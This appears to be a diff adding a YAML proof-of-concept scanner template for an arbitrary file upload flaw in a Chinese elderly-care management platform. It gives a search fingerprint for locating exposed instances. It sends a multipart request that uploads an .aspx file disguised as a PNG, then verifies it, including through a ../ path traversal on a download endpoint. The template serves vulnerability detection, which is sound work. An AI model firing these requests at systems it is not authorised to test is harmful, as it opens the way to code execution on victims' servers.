@@ -1,0 +1,38 @@
+id: poc-yaml-kingonsoft-secmp-uploads-anyfile-upload
+info:
+  name: 金中智慧养老管理平台 Uploads 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金中智慧养老管理平台
+  fofa: body="Content/css/Login/images/gtx-main-bg00004.png"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: concat(dt1,dt2)
+  dt4: datetime("02")
+requests:
+- method: POST
+  path: /Mobile/Uploads
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+  data: '-----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    -----------------------------45250802924973458471174811279'
+  expression: status_code == 200 && contains(body,".aspx")
+- method: GET
+  path: /Content/Upload/{{.dt3}}/{{.dt4}}/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+- method: GET
+  path: /DevApi/DownFile?FileName=../Content/Upload/{{.dt3}}/{{.dt4}}/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
